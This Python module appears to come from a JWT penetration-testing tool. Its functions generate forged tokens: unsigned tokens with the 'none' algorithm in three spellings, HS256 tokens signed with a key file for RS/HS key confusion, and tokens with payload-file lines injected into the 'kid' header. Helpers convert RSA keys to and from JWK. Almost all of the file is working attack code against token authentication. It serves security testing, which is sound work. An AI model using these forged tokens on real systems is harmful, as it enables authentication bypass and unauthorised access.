import json

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKey, RSAPublicNumbers
from cryptography.hazmat.primitives.serialization import load_pem_public_key

import utils
from TestJWT import TestJWT
from utils import read_pem_file, read_file


def attack_none(jwt: TestJWT):
    payloads = {}

    jwt.set_algorithm('none')
    payloads['attack_alg_none'] = utils.force_unicode(jwt.build_token())
    jwt.set_algorithm('None')
    payloads['attack_alg_None'] = utils.force_unicode(jwt.build_token())
    jwt.set_algorithm('NONE')
    payloads['attack_alg_NONE'] = utils.force_unicode(jwt.build_token())

    return payloads


def attack_signature_deception(jwt: TestJWT, url):
    payloads = {}
    secret = read_file(url, strip_newline=False, join_lines=False)
    jwt.set_algorithm("HS256")
    payloads['attack_signature_deception'] = jwt.build_token(secret)
    return payloads


def attack_payload(serial_jwt: str, payload_file: str):
    lines = read_file(payload_file, join_lines=False)
    header, payload, signature = TestJWT.split_jwt(serial_jwt)
    header = json.loads(utils.base64url_decode(header))
    inj_headers = [inject_in_json(header, line) for line in lines]
    payloads = {}
    for index, inj_header in zip(range(1, 1+len(inj_headers)), inj_headers):
        payloads["attack_payload_{}".format(index)] = ".".join(
            [utils.force_unicode(inj_header), payload, signature])
    return payloads


def inject_in_json(header: dict, payload: str):
    key = header['kid']
    if key is not None:
        header['kid'] = payload
    return TestJWT.build_section(header)


def rsa_pubkey_to_jwk(pem_file, key_id=None):
    """
    Only RS256 supported so far
    :param pem_file: path of PEM file containing RSA public key
    :param key_id: (optional) keyid to be included in the JWK
    :return:
    """

    rsa_pk: RSAPublicKey = load_pem_public_key(read_pem_file(pem_file), default_backend())
    e = rsa_pk.public_numbers().e
    n = rsa_pk.public_numbers().n
    jwk = {}
    if key_id is not None:
        jwk['kid'] = key_id
    jwk['kty'] = "RSA"
    jwk["alg"] = "RS256"
    jwk['n'] = utils.base64url_encode(n.to_bytes((n.bit_length() + 7) // 8, byteorder='big'))
    jwk['e'] = utils.base64url_encode(e.to_bytes((e.bit_length() + 7) // 8, byteorder='big'))
    return jwk


def rsa_jwk_to_pubkey(jwk):
    """
    Only RS256 supported so far
    :return:
    """

    e = int.from_bytes(utils.base64url_decode(jwk['e']), byteorder='big')
    n = int.from_bytes(utils.base64url_decode(jwk['n']), byteorder='big')
    pub_num = RSAPublicNumbers(e, n)
    return pub_num.public_key(backend=default_backend())